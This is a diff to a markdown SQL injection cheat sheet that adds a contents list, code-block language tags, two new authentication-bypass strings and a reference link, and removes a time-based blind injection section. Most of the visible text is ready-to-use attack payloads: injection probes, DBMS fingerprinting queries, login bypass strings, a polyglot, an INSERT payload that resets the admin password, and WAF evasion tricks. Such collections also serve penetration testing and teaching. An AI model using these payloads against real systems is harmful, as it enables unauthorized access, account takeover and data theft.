@@ -1,11 +1,20 @@
 # SQL injection
 A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application
 
+## Summary
+* [Entry point detection](#)
+* [DBMS Identification](#)
+* [SQL injection using SQLmap](#)
+* [Authentication bypass](#)
+* [Polyglot injection](#)
+* [Insert Statement - ON DUPLICATE KEY UPDATE](#)
+* [WAF Bypass](#)
+
 
 ## Entry point detection
 Detection of an SQL injection entry point
 Simple characters
-```
+```sql
 '
 %27
 "
@@ -19,13 +28,13 @@ Wildcard (*)
 ```
 
 Multiple encoding
-```
+```sql
 %%2727
 %25%27
 ```
 
 Merging characters
-```
+```sql
 `+HERP
 '||'DERP
 '+'herp
@@ -51,7 +60,7 @@ transformed into U+0027 APOSTROPHE (')
 ```
 
 ## DBMS Identification
-```
+```c
 ["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
 ["connection_id()=connection_id()"                 ,"MYSQL"],
 ["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
@@ -169,12 +178,14 @@ tamper=name_of_the_tamper
 |xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|
 
 ## Authentication bypass
-```
+```sql
 '-'
 ' '
 '&'
 '^'
 '*'
+' or 1=1 limit 1 -- -+
+'="or'
 ' or ''-'
 ' or '' '
 ' or ''&'
@@ -258,26 +269,15 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-## Time based
-```
-SQLite : AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))      comment:   -- /**/
-MySQL/MariaDB : AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1       comment: # -- /*!30100 MySQL code*/
-MySQL/MariaDB : RLIKE SLEEP([SLEEPTIME])                                                  comment: # -- /*!30100 MySQL code*/
-MySQL/MariaDB : OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))                            comment: # -- /*!30100 MySQL code*/
-Oracle : AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                 comment:   -- /**/
-PostGreSQL : AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))                  comment:   -- /**/  
-PostGreSQL : AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))    comment:   -- /**/
-SQL Server : IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'                              comment:   --
-```
 
 ## Polyglot injection (multicontext)
-```
+```sql
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
 ## Insert Statement - ON DUPLICATE KEY UPDATE
 ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
-```
+```sql
 Inject using payload:
   attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --
 
@@ -294,7 +294,7 @@ After this, we can simply authenticate with “admin@example.com” and the pass
 ## WAF Bypass
 
 No Space (%20) - bypass using whitespace alternatives
-```
+```sql
 ?id=1%09and%091=1%09--
 ?id=1%0Dand%0D1=1%0D--
 ?id=1%0Cand%0C1=1%0C--
@@ -304,31 +304,31 @@ No Space (%20) - bypass using whitespace alternatives
 ```
 
 No Whitespace - bypass using comments
-```
+```sql
 ?id=1/*comment*/and/**/1=1/**/--
 ```
 
 No Whitespace - bypass using parenthesis
-```
+```sql
 ?id=(1)and(1)=(1)--
 ```
 
 No Comma - bypass using OFFSET, FROM and JOIN
-```
+```sql
 LIMIT 0,1         -> LIMIT 1 OFFSET 0
 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
 SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
 
 Blacklist using keywords - bypass using uppercase/lowercase
-```
+```sql
 ?id=1 AND 1=1#
 ?id=1 AnD 1=1#
 ?id=1 aNd 1=1#
 ```
 
 Blacklist using keywords case insensitive - bypass using an equivalent operator
-```
+```sql
 AND   -> &&
 OR    -> ||
 =     -> LIKE,REGEXP, not < and not >
@@ -337,7 +337,7 @@ WHERE -> HAVING
 ```
 
 Information_schema.tables Alternative
-```
+```sql
 select * from mysql.innodb_table_stats;
 +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
 | database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
@@ -358,7 +358,7 @@ mysql> show tables in dvwa;
 ```
 
 Version Alternative
-```
+```sql
 mysql> select @@innodb_version;
 +------------------+
 | @@innodb_version |
@@ -400,6 +400,7 @@ mysql> mysql> select version();
 * POSTGRESQL:
   - [PentestMonkey's Postgres SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
 * Others
+  - [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
   - [Access SQLi Cheatsheet] (http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
   - [PentestMonkey's Ingres SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
   - [Pentestmonkey's DB2 SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
